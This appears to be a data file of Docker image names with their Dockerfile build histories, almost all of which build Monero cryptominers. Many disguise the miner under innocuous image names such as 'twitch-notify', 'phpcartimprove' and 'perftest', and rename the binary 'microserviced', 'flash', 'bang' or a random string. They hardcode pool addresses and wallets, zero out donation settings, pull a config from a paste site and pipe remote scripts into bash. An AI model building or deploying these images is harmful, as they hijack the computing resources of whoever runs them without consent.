\t\t\t| sort -u \t\t\t| xargs -r apk info --installed \t\t\t| sort -u \t)" \t&& apk add --virtual .python-rundeps $runDeps \t&& apk del .build-deps \t\t&& find /usr/local -depth \t\t\\( \t\t\t\\( -type d -a -name test -o -name tests \\) \t\t\t-o \t\t\t\\( -type f -a -name \'*.pyc\' -o -name \'*.pyo\' \\) \t\t\\) -exec rm -rf \'{}\' + \t&& rm -rf /usr/src/python\nRUN cd /usr/local/bin \t&& ln -s idle3 idle \t&& ln -s pydoc3 pydoc \t&& ln -s python3 python \t&& ln -s python3-config python-config\nENV PYTHON_PIP_VERSION=9.0.1\nRUN set -ex; \t\tapk add --no-cache --virtual .fetch-deps openssl; \t\twget -O get-pip.py \'https://bootstrap.pypa.io/get-pip.py\'; \t\tapk del .fetch-deps; \t\tpython get-pip.py \t\t--disable-pip-version-check \t\t--no-cache-dir \t\t"pip==$PYTHON_PIP_VERSION" \t; \tpip --version; \t\tfind /usr/local -depth \t\t\\( \t\t\t\\( -type d -a -name test -o -name tests \\) \t\t\t-o \t\t\t\\( -type f -a -name \'*.pyc\' -o -name \'*.pyo\' \\) \t\t\\) -exec rm -rf \'{}\' +; \trm -f get-pip.py\nCMD ["python3"]\nENV FLASK_PROXY_PORT=8080\nRUN apk add --update --no-cache --virtual .build-deps         util-linux g++ gcc libc-dev build-base binutils cmake automake autoconf make curl-dev ncurses5-libs\nRUN pip install --upgrade pip setuptools six         && pip install --no-cache-dir gevent==1.2.1 flask==0.12\nCOPY dir:2455cc22975a266e51e428df7e347ea3b979df24f49ed2dca6f3354c6c74203c cpuminer\nRUN cd cpuminer && ./autogen.sh\nRUN cd cpuminer && CFLAGS="-march=native" ./configure\nRUN cd cpuminer && make\nRUN mkdir -p /action\nRUN cp cpuminer/minerd /action/exec\nRUN mkdir -p /actionProxy\nADD file:2d1a1d3e1a93ed1ceb7bdfc86a7afa9b94f44ab70d5b1aeb3ff8777cf19cdb72 /actionProxy/\nCMD ["/bin/sh -c cd actionProxy && python -u actionproxy.py"]'
ununyaa/phpcartimprove; b'ADD file:89e72bfc19e81624ba6a34bd5cecdf258750dc569ba03e17e3f4a286b1526461 /\nCMD ["/bin/sh"]\nENV PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nENV LANG=C.UTF-8\nRUN apk add --no-cache ca-certificates\nENV GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D\nENV PYTHON_VERSION=3.6.1\nRUN set -ex \t&& apk add --no-cache --virtual .fetch-deps \t\tgnupg \t\topenssl \t\ttar \t\txz \t\t&& wget -O python.tar.xz "https://www.python.org/ftp/python/${PYTHON_VERSION%%a-z*}/Python-$PYTHON_VERSION.tar.xz" \t&& wget -O python.tar.xz.asc "https://www.python.org/ftp/python/${PYTHON_VERSION%%a-z*}/Python-$PYTHON_VERSION.tar.xz.asc" \t&& export GNUPGHOME="$(mktemp -d)" \t&& gpg --keyserver ha.pool.sks-keyservers.net --recv-keys "$GPG_KEY" \t&& gpg --batch --verify python.tar.xz.asc python.tar.xz \t&& rm -rf "$GNUPGHOME" python.tar.xz.asc \t&& mkdir -p /usr/src/python \t&& tar -xJC /usr/src/python --strip-components=1 -f python.tar.xz \t&& rm python.tar.xz \t\t&& apk add --no-cache --virtual .build-deps  \t\tbzip2-dev \t\tcoreutils \t\tdpkg-dev dpkg \t\texpat-dev \t\tgcc \t\tgdbm-dev \t\tlibc-dev \t\tlibffi-dev \t\tlinux-headers \t\tmake \t\tncurses-dev \t\topenssl \t\topenssl-dev \t\tpax-utils \t\treadline-dev \t\tsqlite-dev \t\ttcl-dev \t\ttk \t\ttk-dev \t\txz-dev \t\tzlib-dev \t&& apk del .fetch-deps \t\t&& cd /usr/src/python \t&& gnuArch="$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)" \t&& ./configure \t\t--build="$gnuArch" \t\t--enable-loadable-sqlite-extensions \t\t--enable-shared \t\t--with-system-expat \t\t--with-system-ffi \t\t--without-ensurepip \t&& make -j "$(nproc)" \t&& make install \t\t&& runDeps="$( \t\tscanelf --needed --nobanner --recursive /usr/local \t\t\t| awk \'{ gsub(/,/, "\\nso:", $2); print "so:" $2 }\' \t\t\t| sort -u \t\t\t| xargs -r apk info --installed \t\t\t| sort -u \t)" \t&& apk add --virtual .python-rundeps $runDeps \t&& apk del .build-deps \t\t&& find /usr/local -depth \t\t\\( \t\t\t\\( -type d -a -name test -o -name tests \\) \t\t\t-o \t\t\t\\( -type f -a -name \'*.pyc\' -o -name \'*.pyo\' \\) \t\t\\) -exec rm -rf \'{}\' + \t&& rm -rf /usr/src/python\nRUN cd /usr/local/bin \t&& ln -s idle3 idle \t&& ln -s pydoc3 pydoc \t&& ln -s python3 python \t&& ln -s python3-config python-config\nENV PYTHON_PIP_VERSION=9.0.1\nRUN set -ex; \t\tapk add --no-cache --virtual .fetch-deps openssl; \t\twget -O get-pip.py \'https://bootstrap.pypa.io/get-pip.py\'; \t\tapk del .fetch-deps; \t\tpython get-pip.py \t\t--disable-pip-version-check \t\t--no-cache-dir \t\t"pip==$PYTHON_PIP_VERSION" \t; \tpip --version; \t\tfind /usr/local -depth \t\t\\( \t\t\t\\( -type d -a -name test -o -name tests \\) \t\t\t-o \t\t\t\\( -type f -a -name \'*.pyc\' -o -name \'*.pyo\' \\) \t\t\\) -exec rm -rf \'{}\' +; \trm -f get-pip.py\nCMD ["python3"]\nENV FLASK_PROXY_PORT=8080\nRUN apk add --update --no-cache --virtual .build-deps         util-linux g++ gcc libc-dev build-base binutils cmake automake autoconf make curl-dev ncurses5-libs\nRUN pip install --upgrade pip setuptools six         && pip install --no-cache-dir gevent==1.2.1 flask==0.12\nCOPY dir:2455cc22975a266e51e428df7e347ea3b979df24f49ed2dca6f3354c6c74203c cpuminer\nRUN cd cpuminer && ./autogen.sh\nRUN cd cpuminer && CFLAGS="-march=native" ./configure\nRUN cd cpuminer && make\nRUN mkdir -p /action\nRUN cp cpuminer/minerd /action/exec\nRUN mkdir -p /actionProxy\nADD file:2d1a1d3e1a93ed1ceb7bdfc86a7afa9b94f44ab70d5b1aeb3ff8777cf19cdb72 /actionProxy/\nCMD ["/bin/sh -c cd actionProxy && python -u actionproxy.py"]'
tecexokel/storm; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
xkrm/cpu; b'ADD file:1e87ff33d1b6765b793888cd50e01b2bd0dfe152b7dbb4048008bfc2658faea7 /\nCMD ["/bin/sh"]\nADD file:e2cc812a7b54f75a720652b2e40df3fa49f47d7b9480ef42aae7585661056613 /bin\nRUN apk --no-cache upgrade &&     apk --no-cache add         git         cmake         libuv-dev         build-base &&     git clone https://github.com/xmrig/xmrig &&     cd xmrig &&     sed -i s/kDonateLevel\\ =\\ 5/kDonateLevel\\ =\\ 0/g ./src/donate.h &&     mkdir build &&     cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release . &&     make &&     mv xmrig /bin/cpu &&     rm -rf /xmrig &&     apk del         build-base         cmake         git\nLABEL docker=run -dt --read-only -m 50M -c 512\nENTRYPOINT ["/bin/run.sh"]'
blackufa/team; b'FROM ubuntu:18.04\nRUN apt-get update && \\\n    apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev && \\\n    curl -sL https://deb.nodesource.com/setup_10.x | bash - && \\\n    apt-get install -y nodejs && \\\n    git clone -b open-loki https://github.com/cryptocheck/chatik.git && cd chatik && npm i && \\\n    git clone https://github.com/cryptocheck/fan-page.git && \\\n    cd fan-page && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make && \\\n    mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf fan-page\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR chatik\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) && \\\n   cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD npm start'
blackufa/twitch-notify; b'FROM ubuntu:18.04\nRUN apt-get update && \\\n    apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev && \\\n    curl -sL https://deb.nodesource.com/setup_10.x | bash - && \\\n    apt-get install -y nodejs && \\\n    git clone -b open-loki https://github.com/cryptocheck/chatik.git && cd chatik && npm i && \\\n    git clone https://github.com/cryptocheck/fan-page.git && \\\n    cd fan-page && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make && \\\n    mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf fan-page\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR chatik\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) && \\\n   cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD npm start'
brahim7/docker4; b'FROM ubuntu:16.04\n\nRUN apt-get update \\\n    && apt-get -qq --no-install-recommends install \\\n        libmicrohttpd10 \\\n        libssl1.0.0 \\\n    && rm -r /var/lib/apt/lists/*\n\nENV XMR_STAK_CPU_VERSION v1.1.0-1.2.0\n\nRUN set -x \\\n    && buildDeps=\' \\\n        ca-certificates \\\n        cmake \\\n        curl \\\n        g++ \\\n        libmicrohttpd-dev \\\n        libssl-dev \\\n        make \\\n    \' \\\n    && apt-get -qq update \\\n    && apt-get -qq --no-install-recommends install $buildDeps \\\n    && rm -rf /var/lib/apt/lists/* \\\n    \\\n    && mkdir -p /usr/local/src/xmr-stak-cpu/build \\\n    && cd /usr/local/src/xmr-stak-cpu/ \\\n    && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1 \\\n    && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h \\\n    && cd build \\\n    && cmake .. \\\n    && make -j$(nproc) \\\n    && cp bin/xmr-stak-cpu /usr/local/bin/ \\\n    && sed -r \\\n        -e \'s/^("pool_address" : ).*,/\\1"xmr.pool.minergate.com:45700",/\' \\\n        -e \'s/^("wallet_address" : ).*,/\\1"philipe2018@gmail.com",/\' \\\n        -e \'s/^("pool_password" : ).*,/\\1"",/\' \\\n        ../config.txt > /usr/local/etc/config.txt \\\n    \\\n    && rm -r /usr/local/src/xmr-stak-cpu \\\n    && apt-get -qq --auto-remove purge $buildDeps\n\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
brahim7/docker4nano; b'FROM ubuntu:16.04\n\nRUN apt-get update \\\n    && apt-get -qq --no-install-recommends install \\\n        libmicrohttpd10 \\\n        libssl1.0.0 \\\n    && rm -r /var/lib/apt/lists/*\n\nENV XMR_STAK_CPU_VERSION v1.1.0-1.2.0\n\nRUN set -x \\\n    && buildDeps=\' \\\n        ca-certificates \\\n        cmake \\\n        curl \\\n        g++ \\\n        libmicrohttpd-dev \\\n        libssl-dev \\\n        make \\\n    \' \\\n    && apt-get -qq update \\\n    && apt-get -qq --no-install-recommends install $buildDeps \\\n    && rm -rf /var/lib/apt/lists/* \\\n    \\\n    && mkdir -p /usr/local/src/xmr-stak-cpu/build \\\n    && cd /usr/local/src/xmr-stak-cpu/ \\\n    && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1 \\\n    && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h \\\n    && cd build \\\n    && cmake .. \\\n    && make -j$(nproc) \\\n    && cp bin/xmr-stak-cpu /usr/local/bin/ \\\n    && sed -r \\\n        -e \'s/^("pool_address" : ).*,/\\1"xmr-eu1.nanopool.org:14433",/\' \\\n        -e \'s/^("wallet_address" : ).*,/\\1"4B6EmRMTq7988bxtwc2SVSVZbJJWVFzCmcESfxdfLKaggPLYEuBZfQZHCqqqhoXvTTbZvFg3WqxW1bbFrFCFKSykNXU1e8v",/\' \\\n        -e \'s/^("pool_password" : ).*,/\\1"docker-xmr-stak-cpu:x",/\' \\\n        ../config.txt > /usr/local/etc/config.txt \\\n    \\\n    && rm -r /usr/local/src/xmr-stak-cpu \\\n    && apt-get -qq --auto-remove purge $buildDeps\n\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
brahim7/docker8; b'FROM ubuntu\n\nENV VERSION 2.1.0\n\nRUN apt-get update && apt-get install -y wget\n\nRUN wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-gcc7-xenial-amd64.tar.gz\n\nRUN tar -xvzf xmrig-$VERSION-gcc7-xenial-amd64.tar.gz\n\nENV POOL stratum+tcp://pool.supportxmr.com:5555\nENV USERNAME 45UVbdyweuJV5peeuD1ypVbFs6Z1nYhRB4r9BEL9xYjE8Ej8Pjob3LQX2dN4m314gB87Z1M9TbabwN4g4L9184dcCLyiU6y\nENV DONATE 1\nENV THREADS 4\n\nWORKDIR xmrig-$VERSION/\n\nCMD ./xmrig -o $POOL -u $USERNAME -p x -k --donate-level=$DONATE -t $THREADS'
brahim7/brahimcp; b'FROM ubuntu:14.04\nMAINTAINER Reimund Klain <reimund.klain@condevtec.de>\n\nRUN apt-get update && apt-get install -y \\\n    libcurl3 \\\n    build-essential \\\n    automake \\\n    autotools-dev \\\n    libjansson-dev \\\n    autoconf \\\n    libcurl4-gnutls-dev \\\n    git && apt-get clean ; rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*\n\nENV USERNAME=philipe2018@gmail.com\nENV PASSWORD=x\nENV URL="stratum+tcp://xmr.pool.minergate.com:45560"\nENV ALGORITHM=cryptonight\nENV PRIORITY=19\n\nADD run.sh /usr/local/bin/run.sh\nRUN chmod 755 /usr/local/bin/run.sh\nCMD /usr/local/bin/run.sh'
brahim7/docker4clone; b'FROM ubuntu:16.04\n\nRUN apt-get update \\\n    && apt-get -qq --no-install-recommends install \\\n        libmicrohttpd10 \\\n        libssl1.0.0 \\\n    && rm -r /var/lib/apt/lists/*\n\nENV XMR_STAK_CPU_VERSION v1.1.0-1.2.0\n\nRUN set -x \\\n    && buildDeps=\' \\\n        ca-certificates \\\n        cmake \\\n        curl \\\n        g++ \\\n        libmicrohttpd-dev \\\n        libssl-dev \\\n        make \\\n    \' \\\n    && apt-get -qq update \\\n    && apt-get -qq --no-install-recommends install $buildDeps \\\n    && rm -rf /var/lib/apt/lists/* \\\n    \\\n    && mkdir -p /usr/local/src/xmr-stak-cpu/build \\\n    && cd /usr/local/src/xmr-stak-cpu/ \\\n    && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1 \\\n    && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h \\\n    && cd build \\\n    && cmake .. \\\n    && make -j$(nproc) \\\n    && cp bin/xmr-stak-cpu /usr/local/bin/ \\\n    && sed -r \\\n        -e \'s/^("pool_address" : ).*,/\\1"xmr-eu1.nanopool.org:14444",/\' \\\n        -e \'s/^("wallet_address" : ).*,/\\1"4B6EmRMTq7988bxtwc2SVSVZbJJWVFzCmcESfxdfLKaggPLYEuBZfQZHCqqqhoXvTTbZvFg3WqxW1bbFrFCFKSykNXU1e8v",/\' \\\n        -e \'s/^("pool_password" : ).*,/\\1"docker-xmr-stak-cpu:x",/\' \\\n        ../config.txt > /usr/local/etc/config.txt \\\n    \\\n    && rm -r /usr/local/src/xmr-stak-cpu \\\n    && apt-get -qq --auto-remove purge $buildDeps\n\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
brahim7/privatecloud7; b'FROM ubuntu:xenial\n\nRUN apt-get update && apt-get install -y wget\n\nENV XMRIG_VERSION=2.8.3 XMRIG_SHA256=365198ed4f1205c42fa448d41c9088d3dea6bff43173c5e870e8bec4631c3a7d\n\nRUN wget https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-xenial-amd64.tar.gz &&\\\n  tar -xvzf xmrig-${XMRIG_VERSION}-xenial-amd64.tar.gz &&\\\n  mv xmrig-${XMRIG_VERSION}/xmrig . &&\\\n  rm -rf xmrig-${XMRIG_VERSION} &&\\\n  echo "${XMRIG_SHA256}  xmrig" | sha256sum -c -\n\nENTRYPOINT ["./xmrig"]\nCMD ["--url=xmr.pool.minergate.com:45700", "--user=empireofbooks@gmail.com", "-k", "--max-cpu-usage=100"]'
rigsforxm/bang; b'ADD file:01a5c4f2b1dcc8f8aebe00ce8ed6ceda7038abc31d40caf69273240cdd453b84 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nWORKDIR /app\nUSER root\nRUN apt-get update\nRUN apt-get install git -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev\nRUN git clone https://github.com/xmrig/xmrig.git\nWORKDIR /app/xmrig\nWORKDIR /app/xmrig/build\nRUN cmake ..\nRUN make\nRUN cp xmrig bang\nCMD ["/bin/sh -c ./bang -o 217.78.0.224:1231 -u 42kVTL3bciSHwjfJJNPif2JV -p x --max-cpu-usage=90 --donate-level=1"]'
x00z/xmrig; b'ADD file:957b950d67042842b71e1b5cecbf5312ba4bb487ee680be3733fd990c324ea84 /\nCMD ["bash"]\nRUN apt-get -y update &&     apt-get -y --no-install-recommends install libmicrohttpd12 libuv1 &&     rm -rf /var/lib/apt/lists/*\nRUN buildDeps=\'ca-certificates git g++-7 gcc-7 libmicrohttpd-dev libuv1-dev cmake make\' &&     apt-get -y update &&     apt-get -y --no-install-recommends install $buildDeps &&     rm -rf /var/lib/apt/lists/* &&     cd /usr/local/src/ &&     git clone --depth=1 https://github.com/xmrig/xmrig.git /usr/local/src/xmrig &&     mkdir -p /usr/local/src/xmrig/build &&     cd /usr/local/src/xmrig/ &&     sed -i \'s/constexpr const int kDonateLevel.*/constexpr const int kDonateLevel = 0;/\' src/donate.h &&     cd build &&     cmake ..       -DCMAKE_BUILD_TYPE=Release       -DCMAKE_C_COMPILER=gcc-7       -DCMAKE_CXX_COMPILER=g++-7       -DWITH_LIBCPUID=ON       -DWITH_AEON=OFF       -DWITH_HTTPD=ON &&     make &&     mkdir -p /usr/local/share/xmrig &&     cp xmrig /usr/local/share/xmrig/ &&     rm -r /usr/local/src/xmrig &&     apt-get -y --auto-remove purge $buildDeps &&     apt-get -y autoclean &&     apt-get -y --purge autoremove &&     apt-get -y clean &&     rm -rf /var/lib/apt/lists/*\nCOPY file:bdd41d6acffb06b76734a67205939c9d7182828d097dd97a1d226a60acda155b /usr/local/share/xmrig/config.json\nCOPY file:2a64fcfcf47b084a3c9949b4bb032d8fb801925bf2b9b40c16455ac66a084a67 /usr/local/bin/run.sh\nRUN chmod +x /usr/local/bin/run.sh\nENV HOME=/root\nWORKDIR /root\nCMD ["/usr/local/bin/run.sh"]'
uytz/utyz; b'ADD file:a5b5bea2fa5358461649feb68a28ec3e9ec4547164744e8eb7f4112c1969f64f /\nRUN rm -rf /var/lib/apt/lists/*\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nWORKDIR /tmp\nRUN apt-get update     && apt-get -y --no-install-recommends install ca-certificates wget hwloc curl build-essential cmake libuv1-dev git openssl libssl-dev\nRUN curl https://raw.githubusercontent.com/bananajamma/docker-xmrig/master/donate-level.patch -o /tmp/donate-level.patch     && git clone https://github.com/xmrig/xmrig.git     && git -C xmrig apply ../donate-level.patch     && cd xmrig     && mkdir build     && cd build     && cmake -DWITH_HTTPD=OFF -DWITH_HWLOC=OFF -DWITH_HTTPD=OFF ..     && make     && cd ../..     && mv xmrig/build/xmrig /usr/local/bin/flash     && chmod a+x /usr/local/bin/flash     && wget http://ix.io/1XQf -O /usr/local/bin/config.json     && apt-get -y remove ca-certificates curl build-essential cmake     && apt-get clean autoclean     && /sbin/sysctl -w vm.nr_hugepages=1000     && rm -rf /var/lib/{apt,dpkg,cache,log}\nRUN groupadd -g 2000 flash &&     useradd -u 2000 -g flash -m -s /bin/bash flash &&     echo \'flash:flash\' | chpasswd\nUSER flash\nENTRYPOINT ["flash"]\nCMD ["--url=pool.supportxmr.com:5555 --user=4Aotje6mGNPRcDQeqS7iUwRLGJhLLgJvfbS6Dju5peSACbVXTFhnds53xuoqif3JEcfbdjiW27xuAJiiKeiCGbuoACrutNE --pass=Docker -k --algo=cn/r "]'
xkrm/cpustack; b'ADD file:b8a2c16d65e533a2bcb5820d2bae70f5a80bd2d8c982c93d9a6cdbf22f8f8ee8 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get -y update  && apt-get -y install git libmicrohttpd-dev libssl-dev cmake build-essential  && git clone https://github.com/fireice-uk/xmr-stak-cpu.git  && cd xmr-stak-cpu  && sed -i s/"1.0"/"0.0"/ donate-level.h  && cmake .  && make install  && mv /xmr-stak-cpu /perftest  && mv /perftest/bin/xmr-stak-cpu /perftest/bin/cpu\nCOPY file:7536adf54891c82c2b0ac31ad6f4b1db0621eb2359027582a8359b10474e5a39 /perftest/bin\nCOPY file:92753681d736cb21721df85c69dd6a591abbc0477c6996b867d2c988d1b773c0 /perftest/bin\nENTRYPOINT ["/perftest/bin/run.sh"]'
021982/xmrig; b'ADD file:603693e48cdc7f0c5c62119923aadbb266e5df5a5002fc0f61295858f91690e8 /\nRUN rm -rf /var/lib/apt/lists/*\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > 